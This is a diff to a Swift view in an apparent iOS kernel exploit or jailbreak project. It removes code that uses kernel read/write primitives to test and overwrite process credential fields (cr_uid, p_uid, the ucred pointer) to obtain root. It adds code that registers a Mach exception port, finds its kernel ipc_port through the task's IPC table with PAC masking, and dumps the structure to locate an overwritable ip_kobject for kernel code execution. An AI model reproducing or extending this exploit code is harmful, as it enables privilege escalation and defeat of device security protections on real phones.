@@ -315,83 +315,121 @@ struct BleedingEdgeIOSurfaceKRWView: View {
         let origUid = ds_kread32(ucred + 0x18)
         
         var report = ""
-        report += String(format: "proc:      0x%llx\n", proc)
-        report += String(format: "task:      0x%llx\n", task)
-        report += String(format: "proc_ro:   0x%llx\n", procRo)
-        report += String(format: "ucred:     0x%llx\n", ucred)
-        report += String(format: "orig uid:  %d\n\n", origUid)
+        report += String(format: "proc:     0x%llx\n", proc)
+        report += String(format: "task:     0x%llx\n", task)
+        report += String(format: "proc_ro:  0x%llx\n", procRo)
+        report += String(format: "ucred:    0x%llx\n", ucred)
+        report += String(format: "orig uid: %d\n\n", origUid)
         
         // ============================================================
-        // SAFE WRITABILITY TEST
-        // Only test INTEGER fields (not pointers!)
-        // Method: try write 0 to uid fields, read back
-        // If value changed → writable. If same → PPL blocked.
-        // NO bit flipping on pointer fields (that caused panic)
+        // EXPERIMENT: Exception Port Hijack for Kernel Code Execution
+        //
+        // Theory:
+        // 1. Set exception port on our thread/task
+        // 2. Exception port is a mach port → has a kernel ipc_port object
+        // 3. ipc_port has ip_kobject field (for kernel-handled ports)
+        // 4. When exception fires, kernel calls handler via port
+        // 5. If we can redirect the handler → kernel code execution
+        //
+        // Step 1 (this build): DISCOVERY
+        // - Set exception port
+        // - Find the port's kernel address via task→itk_space→is_table
+        // - Dump port structure
+        // - Identify what we can overwrite
         // ============================================================
         
-        report += "=== WRITABILITY TEST (safe, no pointer modification) ===\n\n"
+        report += "=== EXCEPTION PORT EXPERIMENT ===\n\n"
         
-        // Test 1: ucred cr_uid (offset 0x18 from ucred)
-        let uidBefore = ds_kread32(ucred + 0x18)
-        ds_kwrite32(ucred + 0x18, 0)
-        let uidAfter = ds_kread32(ucred + 0x18)
-        ds_kwrite32(ucred + 0x18, uidBefore)  // Restore
-        report += String(format: "ucred+0x18 (cr_uid):  %@ (was %d, wrote 0, got %d)\n",
-                        uidAfter == 0 ? "✅ WRITABLE" : "❌ BLOCKED", uidBefore, uidAfter)
+        // Step 1: Allocate a mach port for exception handling
+        var excPort: mach_port_t = 0
+        var kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &excPort)
+        guard kr == KERN_SUCCESS else {
+            report += String(format: "mach_port_allocate failed: %d\n", kr)
+            rootResult = report
+            return
+        }
         
-        // Test 2: proc p_uid (offset 0x2c)
-        let puidBefore = ds_kread32(proc + 0x2c)
-        ds_kwrite32(proc + 0x2c, 0)
-        let puidAfter = ds_kread32(proc + 0x2c)
-        ds_kwrite32(proc + 0x2c, puidBefore)  // Restore
-        report += String(format: "proc+0x2c (p_uid):    %@ (was %d, wrote 0, got %d)\n",
-                        puidAfter == 0 ? "✅ WRITABLE" : "❌ BLOCKED", puidBefore, puidAfter)
+        kr = mach_port_insert_right(mach_task_self(), excPort, excPort, mach_msg_type_name_t(MACH_MSG_TYPE_MAKE_SEND))
+        guard kr == KERN_SUCCESS else {
+            report += String(format: "mach_port_insert_right failed: %d\n", kr)
+            rootResult = report
+            return
+        }
         
-        // Test 3: proc p_flag (offset from offsets.h)
-        let flagBefore = ds_kread32(proc + UInt64(off_proc_p_flag))
-        ds_kwrite32(proc + UInt64(off_proc_p_flag), flagBefore)  // Write same (safe)
-        let flagAfter = ds_kread32(proc + UInt64(off_proc_p_flag))
-        report += String(format: "proc+0x%x (p_flag):  readable (%@)\n",
-                        off_proc_p_flag, flagBefore == flagAfter ? "consistent" : "changed?!")
+        report += String(format: "Exception port allocated: 0x%x\n", excPort)
         
-        // Test 4: proc_ro ucred pointer
-        let ucredPtrBefore = ds_kread64(procRo + UInt64(off_proc_ro_p_ucred))
-        ds_kwrite64(procRo + UInt64(off_proc_ro_p_ucred), 0x4141414141414141)
-        let ucredPtrAfter = ds_kread64(procRo + UInt64(off_proc_ro_p_ucred))
-        // Don't need to restore — if PPL blocked, value didn't change
-        if ucredPtrAfter == 0x4141414141414141 {
-            // OH SHIT it worked — restore immediately!
-            ds_kwrite64(procRo + UInt64(off_proc_ro_p_ucred), ucredPtrBefore)
-            report += "proc_ro ucred ptr:    ✅ WRITABLE!!\n"
+        // Step 2: Set as task exception port
+        kr = task_set_exception_ports(
+            mach_task_self(),
+            exception_mask_t(EXC_MASK_ALL),
+            excPort,
+            Int32(EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES),
+            ARM_THREAD_STATE64
+        )
+        report += String(format: "task_set_exception_ports: %d (%@)\n\n", kr, kr == KERN_SUCCESS ? "OK" : "FAIL")
+        
+        // Step 3: Find port's kernel address
+        // Port name (excPort) maps to entry in itk_space→is_table
+        // Entry index = port name >> 8 (on iOS)
+        let portIndex = UInt64(excPort) >> 8
+        report += String(format: "Port index: %d (name=0x%x >> 8)\n", portIndex, excPort)
+        
+        // Read itk_space and is_table
+        let itkSpace = ds_kread64(task + UInt64(off_task_itk_space))
+        report += String(format: "itk_space: 0x%llx\n", itkSpace)
+        
+        // is_table pointer — try reading it
+        let isTableRaw = ds_kread64(itkSpace + UInt64(off_ipc_space_is_table))
+        report += String(format: "is_table (raw): 0x%llx\n", isTableRaw)
+        
+        // Try with PAC mask
+        let isTable = isTableRaw | pac_mask
+        report += String(format: "is_table (stripped): 0x%llx\n\n", isTable)
+        
+        // Step 4: Read our port's entry
+        let entrySize = UInt64(sizeof_ipc_entry)
+        let entryAddr = isTable + portIndex * entrySize
+        report += String(format: "Entry addr: 0x%llx (idx=%d, size=%d)\n", entryAddr, portIndex, entrySize)
+        
+        // Read ie_object (port pointer) — use safe read
+        let ieObject = ds_kread64_safe(entryAddr + UInt64(off_ipc_entry_ie_object))
+        report += String(format: "ie_object (raw): 0x%llx\n", ieObject)
+        
+        if ieObject == 0 {
+            report += "ie_object is 0 — port entry not found at this index.\n"
+            report += "Port name encoding may differ on iOS 18.\n"
+            mach_port_deallocate(mach_task_self(), excPort)
+            rootResult = report
+            return
+        }
+        
+        let portKaddr = ieObject | pac_mask
+        report += String(format: "Port kaddr: 0x%llx\n\n", portKaddr)
+        
+        // Step 5: Dump port structure (if accessible)
+        if ds_isvalid(portKaddr) {
+            report += "=== PORT STRUCT DUMP ===\n"
+            for i in stride(from: 0, to: 0x80, by: 8) {
+                let val = ds_kread64_safe(portKaddr + UInt64(i))
+                var note = ""
+                if i == Int(off_ipc_port_ip_kobject) { note = " ← ip_kobject" }
+                report += String(format: "  port+0x%02x: 0x%016llx%@\n", i, val, note)
+            }
+            
+            report += "\n=== ANALYSIS ===\n"
+            report += "If we can overwrite ip_kobject or handler pointer,\n"
+            report += "triggering an exception will call our controlled address\n"
+            report += "in KERNEL context → kernel code execution → root.\n"
+            report += "\nNext: test if port struct fields are writable.\n"
         } else {
-            report += String(format: "proc_ro ucred ptr:    ❌ BLOCKED (still 0x%llx)\n", ucredPtrAfter)
+            report += "Port kaddr not accessible via socket KRW.\n"
+            report += "Port may be in different zone.\n"
         }
         
-        // Test 5: cr_label pointer in ucred (we know sandbox escape writes here)
-        let labelBefore = ds_kread64(ucred + UInt64(off_ucred_cr_label))
-        report += String(format: "ucred+0x%x (cr_label): 0x%llx (sandbox escape writes here)\n",
-                        off_ucred_cr_label, labelBefore)
+        // Cleanup
+        mach_port_deallocate(mach_task_self(), excPort)
         
-        // ============================================================
-        // SUMMARY
-        // ============================================================
-        
-        report += "\n=== SUMMARY ===\n"
-        report += "cr_uid direct write: \(uidAfter == 0 ? "POSSIBLE → ROOT!" : "PPL BLOCKED")\n"
-        report += "proc p_uid write:    \(puidAfter == 0 ? "POSSIBLE (cosmetic)" : "BLOCKED")\n"
-        report += "proc_ro ucred ptr:   \(ucredPtrAfter == 0x4141414141414141 ? "WRITABLE!" : "PPL BLOCKED")\n"
-        
-        if uidAfter == 0 {
-            report += "\n🎉 cr_uid IS writable! Getting root...\n"
-            ds_kwrite32(ucred + 0x18, 0)
-            ds_kwrite32(ucred + 0x1c, 0)
-            ds_kwrite32(ucred + 0x20, 0)
-            let newUid = getuid()
-            report += String(format: "getuid() = %d\n", newUid)
-            if newUid == 0 { report += "🎉🎉🎉 ROOT! 🎉🎉🎉\n" }
-        }
-        
-        report += "\n=== DONE (no panics expected) ===\n"
+        report += "\n=== DONE ===\n"
         rootResult = report
     }
 }
